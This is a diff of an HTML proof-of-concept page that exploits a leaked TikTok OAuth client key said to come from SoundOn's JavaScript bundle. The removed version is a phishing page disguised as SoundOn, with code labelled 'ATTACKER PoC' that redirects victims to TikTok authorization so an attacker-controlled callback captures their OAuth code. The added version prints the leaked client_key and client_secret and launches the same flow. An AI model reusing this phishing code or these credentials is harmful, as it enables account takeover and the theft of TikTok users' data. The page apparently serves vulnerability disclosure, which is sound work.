@@ -3,75 +3,63 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SoundOn — TikTok Music Distribution</title>
+<title>TikTok OAuth Demo — Redirecting...</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-.card { background: #111; border-radius: 16px; padding: 48px; max-width: 480px; width: 90%; text-align: center; border: 1px solid #222; }
-.logo { font-size: 28px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.5px; }
-.logo span { color: #ff0050; }
-.subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
-.btn { display: inline-block; background: #ff0050; color: #fff; border: none; padding: 14px 48px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; margin: 8px; }
-.btn:hover { background: #e00045; }
-.btn-outline { background: transparent; border: 1px solid #ff0050; color: #ff0050; }
-.btn-outline:hover { background: rgba(255,0,80,0.1); }
-.features { display: flex; gap: 16px; margin: 24px 0; text-align: left; }
-.feature { flex: 1; background: #1a1a1a; padding: 16px; border-radius: 8px; font-size: 13px; color: #aaa; }
-.feature strong { display: block; color: #fff; margin-bottom: 4px; }
-.footer { margin-top: 24px; font-size: 11px; color: #555; }
-.loader { display: none; margin: 20px auto; border: 3px solid #333; border-top: 3px solid #ff0050; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; }
-@keyframes spin { to { transform: rotate(360deg); } }
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 720px; margin: 0 auto; }
+h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 8px; }
+.label { color: #888; }
+.val { color: #ff0; word-break: break-all; }
+.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
+.btn { display: inline-block; background: #fe2c55; color: #fff; border: none; padding: 12px 32px; border-radius: 6px; font-size: 15px; cursor: pointer; text-decoration: none; }
+.warn { color: #fe2c55; }
 </style>
 </head>
 <body>
-<div class="card">
-<div class="logo">Sound<span>On</span></div>
-<div class="subtitle">Get your music on TikTok, Spotify &amp; more</div>
+<h1>TikTok OAuth Client Credential Exposure — PoC</h1>
 
-<div class="features">
-<div class="feature"><strong>100% Royalties</strong>Keep everything you earn</div>
-<div class="feature"><strong>TikTok Music Tab</strong>Reach millions on TikTok</div>
-<div class="feature"><strong>Spotify Access</strong>Spotify for Artists included</div>
+<div class="section">
+<h2>Leaked Credentials (from SoundOn adek.js)</h2>
+<div><span class="label">client_key:</span> <span class="val">awulj3e36brrh086</span></div>
+<div><span class="label">client_secret:</span> <span class="val">e63acb9afab646ee9340f16a2380b1ed</span></div>
+<div><span class="label">source:</span> <span class="val">index.24851df7.js :: module 69544</span></div>
 </div>
 
-<a class="btn" id="connectBtn" href="#" onclick="startOAuth(); return false;">
-Connect TikTok Account →
-</a>
-
-<div class="loader" id="loader"></div>
-<div class="footer">
-By connecting, you authorize SoundOn to manage your music distribution.<br>
-<a href="#" style="color:#555">Terms</a> · <a href="#" style="color:#555">Privacy</a>
+<div class="section">
+<h2>OAuth Authorization URL</h2>
+<div><span class="label">endpoint:</span> <span class="val">https://www.tiktok.com/v2/auth/authorize/</span></div>
+<div><span class="label">client_key:</span> <span class="val">awulj3e36brrh086</span></div>
+<div><span class="label">scope:</span> <span class="val">user.info.basic,user.info.username</span></div>
+<div><span class="label">response_type:</span> <span class="val">code</span></div>
+<div><span class="label">redirect_uri:</span> <span class="val" id="cbDisplay">...</span></div>
+<div><span class="label">state:</span> <span class="val" id="stateDisplay">...</span></div>
 </div>
+
+<div class="section">
+<p>Clicking the button below initiates the TikTok OAuth authorization flow using
+the <span class="warn">leaked client_key</span>. After authorization, TikTok will redirect
+to this server with the authorization code.</p>
+<br>
+<a class="btn" id="goBtn" href="#" onclick="go(); return false;">▶ Initiate TikTok OAuth Authorization</a>
 </div>
 
 <script>
-// === ATTACKER PoC: TikTok OAuth Phishing ===
-// Leaked client_key from SoundOn's adek.js (module 69544)
-const STOLEN_CLIENT_KEY = "awulj3e36brrh086";
+const CLIENT_KEY = "awulj3e36brrh086";
+const SCOPE = "user.info.basic,user.info.username";
+const CALLBACK = window.location.origin + window.location.pathname.replace("index.html","") + "callback.html";
+const STATE = "poc_" + Date.now();
 
-// The callback URL — attacker-controlled endpoint that captures the OAuth code
-const CALLBACK_URL = encodeURIComponent(
-  window.location.origin + window.location.pathname.replace("index.html","") + "callback.html"
-);
+document.getElementById("cbDisplay").textContent = CALLBACK;
+document.getElementById("stateDisplay").textContent = STATE;
 
-function startOAuth() {
-  document.getElementById("loader").style.display = "block";
-  document.getElementById("connectBtn").style.opacity = "0.5";
-
-  const state = "csrf_" + Math.random().toString(36).substring(2, 15);
-  sessionStorage.setItem("oauth_state", state);
-
-  const authUrl =
+function go() {
+  const url =
     "https://www.tiktok.com/v2/auth/authorize/?" +
-    "client_key=" + STOLEN_CLIENT_KEY +
-    "&scope=user.info.basic,user.info.username,user.info.profile" +
+    "client_key=" + CLIENT_KEY +
+    "&scope=" + SCOPE +
     "&response_type=code" +
-    "&redirect_uri=" + CALLBACK_URL +
-    "&state=" + state;
-
-  // Redirect victim to TikTok OAuth
-  window.location.href = authUrl;
+    "&redirect_uri=" + encodeURIComponent(CALLBACK) +
+    "&state=" + STATE;
+  window.location.href = url;
 }
 </script>
 </body>
